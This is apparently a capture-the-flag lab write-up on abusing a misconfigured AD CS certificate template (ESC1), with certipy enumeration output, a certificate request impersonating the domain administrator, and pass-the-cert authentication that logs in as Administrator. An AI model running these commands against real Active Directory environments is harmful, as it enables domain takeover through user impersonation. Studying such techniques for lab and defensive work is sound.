# ADCS

AD CS is a Microsoft server role solution for public key infrastructure (PKI) that provides various services within an AD environment, in the form of certificate-based client authentication.
Misconfigurations in certificate templates bring about various vulnerabilities, which we will explore in this writeup. 

### Enumeration

```$ certipy find -u 'username@authority.htb' -p 'password' -dc-ip 10.10.11.222 -enabled```

```
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "AUTHORITY-CA",
      "DNS Name": "authority.authority.htb",
      "Certificate Subject": "CN=AUTHORITY-CA, DC=authority, DC=htb",
      "Permissions": {
          "512": [
            "AUTHORITY.HTB\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "1": {
      "Template Name": "CorpVPN",
      "Display Name": "Corp VPN",
      "Certificate Authorities": [
        "AUTHORITY-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        "EnrolleeSuppliesSubject"
      ],
      "Extended Key Usage": [
        "Client Authentication",
        "KDC Authentication"
      ],
      "Requires Manager Approval": false,
      "Authorized Signatures Required": 0,
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "AUTHORITY.HTB\\Domain Computers",
          ]
        }
        }
      },
      "[!] Vulnerabilities": {
        "ESC1": "'AUTHORITY.HTB\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication"
      }
    },
  }
```

for example, the template 'CorpVPN' is vulnerable to 'ESC1', where an enrolle from the Domain Computers security group can supply a subject for client authentication, effectively allowing the impersonation of users in the domain.

### Exploitation

An attacker with a user or machine account with an enrollment right would request a certificate with the UPN of the victim account:
```$ certipy req -u 'pc01$' -p 'password' -template CorpVPN -upn 'administrator@authority.htb -target authority.authority.htb -ca AUTHORITY-CA'```

```
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

## generate a crt and key for later authentication
```$ certipy cert -pfx administrator.pfx -nokey -out administrator.crt```

```[*] Writing certificate and  to 'administrator.crt'```

```$ certipy cert -pfx administrator.pfx -nocert -out administrator.key```

```[*] Writing private key to 'administrator.key'```
## authentication using passthecert.py
```$ python passthecert.py -action whoami -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -new-pass password```
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] You are logged in as: HTB\Administrator
```

if the regkey ```HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement``` is set to 2, attackers will have to supply the szOID_NTDS_CA_SECURITY_EXT value when making a certificate request.

```If (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement") {(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc").StrongCertificateBindingEnforcement}```
